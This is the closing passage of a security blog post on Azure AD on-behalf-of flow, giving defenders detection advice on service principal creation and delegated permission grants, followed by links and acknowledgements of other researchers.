  1. Keep a list of all service principals in the tenant and create an alert whenever a new one is created. Any time a user consents to a new external application, a service principal will be created in the tenant to service that application. Knowing this, you can create an alert for the activity type “Add service principal”. This will trigger when an attacker either creates a new application registration OR consents to an external application.
  2. Receive alerts whenever a user consents to an application requesting access to a resource. In the event log, you can filter on the activity type “Add delegated permission grant”

![](https://specterops.io/wp-content/uploads/sites/3/2023/03/1IvfPyb7O9eyMGoseAg7WHA.png)Suspicious AF

That looks pretty weird. If you monitor a large enterprise, you very may well be flooded with these, but they **_should_** be for trusted applications like Slack, Workday, etc. or for internal applications. The key piece of information is the client ID. Every new client ID should be investigated thoroughly.

Ultimately, as a defender, a periodic review of all of the service principals in the tenant should not yield any surprises.

### Source

If you’d like to play around with on-behalf-of flow for Azure AD, I uploaded some scripts here:  
<https://github.com/hotnops/obo-wash>

### Acknowledgements

  * The deep roster of rock stars at [SpecterOps](https://medium.com/u/f4ab382d41)
  * Thanks to @DrAzureAD for [AADInternals](https://aadinternals.com/aadinternals/)
  * Thanks to @_dirkjan for [ROADTools](https://github.com/dirkjanm/ROADtools)
  * Ryan Cobb (@detectdotdev) from SecureWorks [awesome research](https://troopers.de/downloads/troopers22/TR22_AbusingFamilyRefreshTokens.pdf) on [FOCIs](https://github.com/secureworks/family-of-client-ids-research)
  * The Mircosoft/AzureAD team and their quick responses

![](https://specterops.io/wp-content/uploads/sites/3/2023/03/16Y_0IjlVfjva3EGbXbGF-Q.jpeg)

![](https://medium.com/_/stat?event=post.clientViewed&referrerSource=full_rss&postId=8f79fff839ac)

* * *

[I’d TAP That Pass](https://posts.specterops.io/id-tap-that-pass-8f79fff839ac) was originally published in [Posts By SpecterOps Team Members](https://posts.specterops.io) on Medium, where people are continuing the conversation by highlighting and responding to this story.

Post Views: 2,832
